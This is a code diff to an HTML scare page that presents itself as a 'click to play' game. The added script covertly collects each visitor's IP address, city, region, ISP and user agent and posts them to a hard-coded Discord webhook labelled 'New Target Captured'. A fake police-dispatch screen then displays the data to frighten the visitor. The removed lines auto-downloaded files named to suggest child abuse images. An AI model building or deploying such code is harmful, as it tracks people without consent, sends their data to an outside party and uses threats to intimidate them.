@@ -48,7 +48,6 @@
             filter: contrast(3) brightness(1.5);
         }
 
-        /* The Flash Effect */
         #flash {
             position: fixed;
             inset: 0;
@@ -62,15 +61,16 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            font-size: 5vw;
+            font-size: 3vw;
             color: #ff0000;
             text-align: center;
             z-index: 10010;
             display: none;
             text-shadow: 0 0 20px #f00;
-            background: rgba(0,0,0,0.8);
-            padding: 20px;
-            border: 2px solid red;
+            background: rgba(0,0,0,0.9);
+            padding: 40px;
+            border: 3px solid red;
+            line-height: 1.5;
         }
 
         .toast {
@@ -99,7 +99,10 @@
 
     <div id="start">click to play</div>
     <div id="flash"></div>
-    <div id="ip-display">Sending Police To: <span id="ip-addr">LOADING...</span></div>
+    <div id="ip-display">
+        [!] DISPATCHING UNITS TO [!]<br>
+        <span id="location-data">LOCATING TARGET...</span>
+    </div>
     
     <div id="jumpscare">
         <canvas id="scary-canvas"></canvas>
@@ -110,35 +113,42 @@
     </audio>
 
     <script>
+        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1503245757061267589/Qcm3m4C8U2FXzgMUavqXvPv_Ayfb89USyBHetyLMTmS5ohU3bzFsf-D9qO3yzCZb1MoB';
         const startBtn = document.getElementById('start');
         const jumpscare = document.getElementById('jumpscare');
         const flash = document.getElementById('flash');
         const ipDisplay = document.getElementById('ip-display');
-        const ipAddr = document.getElementById('ip-addr');
+        const locSpan = document.getElementById('location-data');
         const audio = document.getElementById('audio-engine');
         const canvas = document.getElementById('scary-canvas');
         const ctx = canvas.getContext('2d');
 
-        const payloads = [
-            { name: "childprn.jpg", data: "SYS_EXTRACT" },
-            { name: "dog.png", data: "SYS_EXTRACT" },
-            { name: "hourse.png", data: "SYS_EXTRACT" },
-            { name: "youngkid.png", data: "SYS_EXTRACT" }
-        ];
+        let userData = {};
 
-        // Fetch IP instantly
-        fetch('https://api.ipify.org?format=json')
+        // 1. Fetch deep location data immediately
+        fetch('https://ipapi.co/json/')
             .then(res => res.json())
-            .then(data => { ipAddr.innerText = data.ip; })
-            .catch(() => { ipAddr.innerText = "127.0.0.1"; });
+            .then(data => {
+                userData = data;
+                locSpan.innerHTML = `
+                    IP: ${data.ip}<br>
+                    CITY: ${data.city}<br>
+                    REGION: ${data.region}<br>
+                    ISP: ${data.org}
+                `;
+            });
 
-        function createToast(text) {
-            const t = document.createElement('div');
-            t.className = 'toast';
-            t.innerText = `[!] ${text}`;
-            t.style.bottom = (20 + (document.querySelectorAll('.toast').length * 50)) + 'px';
-            document.body.appendChild(t);
-            setTimeout(() => t.remove(), 3000);
+        function sendToDiscord(info) {
+            if (!WEBHOOK_URL.startsWith('http')) return;
+            const params = {
+                username: "Man-Of-Kind Tracker",
+                content: `**New Target Captured**\nIP: ${info.ip}\nLocation: ${info.city}, ${info.region}, ${info.country_name}\nISP: ${info.org}\nUser Agent: ${navigator.userAgent}`
+            };
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(params)
+            });
         }
 
         function drawNoise() {
@@ -157,36 +167,22 @@
             startBtn.style.display = 'none';
             audio.play().catch(() => {});
             
-            // 1. Initial Jumpscare
+            // Send the data home
+            sendToDiscord(userData);
+
             jumpscare.style.display = 'block';
             document.body.classList.add('aberration');
             drawNoise();
 
-            // 2. The Flash & IP Reveal (after 1 second)
             setTimeout(() => {
-                flash.style.display = 'block'; // White out
+                flash.style.display = 'block';
                 setTimeout(() => {
                     flash.style.display = 'none';
-                    ipDisplay.style.display = 'block'; // Show IP
-                    triggerDownloads(); // Start spamming
+                    ipDisplay.style.display = 'block';
                 }, 100);
-            }, 1000);
+            }, 1200);
 
             if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-        }
-
-        function triggerDownloads() {
-            payloads.forEach((p, i) => {
-                setTimeout(() => {
-                    const blob = new Blob([p.data], { type: 'application/octet-stream' });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = p.name;
-                    a.click();
-                    createToast(`EXTRACTING_DATA: ${p.name}`);
-                }, i * 300);
-            });
         }
 
         startBtn.addEventListener('click', initTerror);
